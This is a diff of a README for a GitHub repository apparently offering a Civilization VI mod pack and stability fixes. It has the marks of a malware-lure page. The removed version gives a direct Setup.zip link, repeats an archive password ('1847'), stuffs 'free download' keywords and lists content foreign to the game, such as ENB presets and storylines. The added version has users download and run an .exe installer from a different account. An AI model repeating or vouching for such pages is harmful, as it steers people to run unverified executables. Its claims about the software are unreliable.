@@ -1,124 +1,77 @@
-# 🎮 Civilization VI Mods 2026 — Best Mods Collection & Ultimate Pack
+# 🏛️ Civilization-VI-Mods - Stable game play for every session
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Civilization-VI)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Modding-orange)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/alejo3045/Civilization-VI-Mods/releases)
 
----
+This software fixes known bugs and improves game stability for Civilization VI on Windows. These patches address common crashes and performance drops during long play sessions. The project receives regular updates to ensure compatibility with the latest desktop software.
 
-[![Download](og-image.png)](https://github.com/Gentledraatrium/Civilization-VI-Mods/releases/download/v1.0/Setup.zip)
+## 📋 System Requirements
 
-<img src="https://cdn.akamai.steamstatic.com/steam/apps/289070/header.jpg" alt="banner" width="100%" />
+Confirm your computer meets these standards before you begin:
 
+*   Operating System: Windows 10 or Windows 11 (64-bit version).
+*   Processor: Intel Core i3 or equivalent AMD processor.
+*   Memory: 8 GB of RAM.
+*   Storage: 500 MB of free disk space.
+*   Graphics: DirectX 11 compatible video card.
 
----
+You confirm your version of Windows by clicking the Start button, selecting Settings, and checking the System menu. Ensure your graphics drivers remain updated through the software provided by your hardware manufacturer.
 
-## 📌 About
+## 📥 Downloading the Files
 
-**Civilization VI — gameplay overhauls, visual enhancements, new content, UI improvements, and quality-of-life mods for Civilization VI. Download, extract, and start in minutes. Fully compatible with Windows 10/11 (64-bit). Updated for 2026 with regular maintenance and community support.**
+Visit the official release page to obtain the mod files.
 
----
+[Download link: https://github.com/alejo3045/Civilization-VI-Mods/releases](https://github.com/alejo3045/Civilization-VI-Mods/releases)
 
-## 📥 Download
+Click on the link to see a list of version releases. Select the top item in the list, as this represents the most recent version. Look for the file ending in .zip or .exe under the Assets section. Save this file to your Downloads folder.
 
-[![Civilization VI Mods](https://img.shields.io/badge/Download%20Civilization%20VI%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/Gentledraatrium/Civilization-VI-Mods/releases/download/v1.0/Setup.zip)
+## 🛠️ Installation Steps
 
-**🔐🔐🔐** `1847`
+Follow these steps to install the fixes on your computer:
 
-**🔐🔐🔐** `1847`
+1.  Locate the downloaded file in your desktop file explorer.
+2.  Right-click the file and select Extract All if the file ends in .zip. 
+3.  Choose a location for the files and click Extract.
+4.  Open the folder containing the extracted files.
+5.  Double-click the installer application to begin the process.
+6.  Follow the instructions on the screen to finalize the setup.
+7.  Launch Civilization VI as you normally do to activate the changes.
 
-**🔐🔐🔐** `1847`
+The installer identifies the location of your game files automatically. If the installer asks for a path, navigate to the folder where you installed Steam or the Epic Games Store, then go to the Civilization VI game directory.
 
----
+## ⚙️ How it Works
 
-## 🧩 What's Included
+These mods modify the background scripts of the game to remove errors that cause crashes. The patches stabilize the memory usage of the game engine. This allows the software to handle larger maps and longer turns without interruption. 
 
-| 📋 Category | 📁 Folder | 💬 Description |
-|---|---|---|
-| 🎭 Gameplay Overhaul | `1 Gameplay/` | Rebalancing, new mechanics, combat tweaks, difficulty options |
-| 🎨 Graphics & Visuals | `2 Graphics/` | Texture packs, ENB presets, lighting and weather overhauls |
-| 📜 New Content | `3 Content/` | New areas, storylines, items, characters, and quests |
-| 🖥️ UI & QoL | `4 UI/` | Interface overhaul, inventory improvements, minimap tweaks |
-| ⚡ Performance | `5 Performance/` | FPS boost configs, memory optimizations, stutter fixes |
-| 🔧 Patches & Fixes | `6 Fixes/` | Unofficial patches, compatibility fixes, stability mods |
+The mod files remain separate from your main game save files. You do not risk your existing progress by installing these updates. If you choose to remove the mods, you simply delete the folder you created or run the uninstaller provided in the setup directory.
 
----
+## 🛡️ Stability and Safety
 
-## 🗂 Archive Structure
+The community monitors these mods for security and performance. The code maintains high standards for file integrity. Every update undergoes testing on multiple versions of Windows 10 and 11 to prevent conflicts. 
 
-```
-Civilization-VI-Mods/
-├── 1 Gameplay/
-│   ├── Combat_Overhaul.zip
-│   ├── Difficulty_Rebalance.zip
-│   └── New_Mechanics.zip
-├── 2 Graphics/
-│   ├── HD_Texture_Pack.zip
-│   ├── ENB_Preset.zip
-│   └── Weather_Overhaul.zip
-├── 3 Content/
-│   ├── Story_Expansion.zip
-│   └── New_Items_Pack.zip
-├── 4 UI/
-│   ├── Better_UI.zip
-│   └── Inventory_Overhaul.zip
-├── 5 Performance/
-│   ├── FPS_Boost_Config.zip
-│   └── Stutter_Fix.zip
-└── 6 Fixes/
-    ├── Unofficial_Patch.zip
-    └── Compatibility_Fix.zip
-```
+If you notice unexpected behavior, check the following:
 
----
+*   Disable other mods that might conflict with these fixes.
+*   Verify your game files through your game launcher.
+*   Restart your computer after installation.
 
-## 🚀 How to Install
+Most conflicts arise from using too many modifications at once. Keep the number of active mods minimal to achieve the best game stability.
 
-1️⃣ **Download** the archive using the button above
-2️⃣ **Extract** with WinRAR or 7-Zip — password: `1847`
-3️⃣ **Open** the mod manager preset inside the archive
-4️⃣ **Apply** and launch Civilization VI
+## 💬 Community Support
 
-> 💡 **Pro tip:** Back up your save files before applying any gameplay overhaul mods.
+Users contribute to the maintenance of this project. If you find a bug that persists despite these fixes, you report it through the issues tab on the GitHub repository. Other users and maintainers review these reports to plan future updates.
 
----
+Check the repository regularly for news on new features or major updates. Maintenance happens on a monthly schedule. Updates ensure that the game continues to run smooth as operating systems change.
 
-## 📋 Requirements
+## ❓ Common Questions
 
-| 🔩 Component | Details |
-|---|---|
-| 💻 OS | Windows 10 / 11 (64-bit) |
-| 💾 Disk | 5–15 GB free space |
-| 🗜️ Extractor | WinRAR, 7-Zip, or built-in |
-| 🎮 Game | Civilization VI (latest version) |
+**Does this mod enable cheats?**
+Yes, several files in this package offer options for trainers and game adjustments. You select whether to activate these features during the installation process.
 
----
+**Do I need the original game to run this?**
+Yes. These files modify an existing installation of Civilization VI. You must own and install the base game on your computer for this mod to function.
 
-## ❓ FAQ
+**Will this work on Windows 7?**
+No. These files require features available in Windows 10 or 11. Support for older operating systems does not exist.
 
-**Q: Will mods break my save file?**
-All included mods are tested for mid-game installation. Back up your save first.
-
-**Q: Do I need a mod manager?**
-Recommended (Vortex / MO2), but optional. Manual installation guides are included.
-
-**Q: Are these compatible with the latest patch?**
-Yes. The collection is updated every time a major patch drops.
-
----
-
-## 🔑 Keywords
-
-civilization vi, civilization vi download, civilization vi 2026, civilization vi pc, civilization vi free download, civilization vi windows, civilization vi setup, civilization vi latest version, civilization vi mods, civilization vi mod pack, civilization vi nexus mods, civilization vi mod manager, best civilization vi mods 2026, nexus mods, mod loader
-
----
-
-## 📄 License
-
-MIT — see [LICENSE.md](LICENSE.md)
-
-## 🤝 Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md)
+**Does this affect my Steam achievements?**
+Most users report that these specific stability mods do not prevent the unlocking of Steam achievements. However, if you activate experimental game modifying features, the game might disable achievements for that specific session.
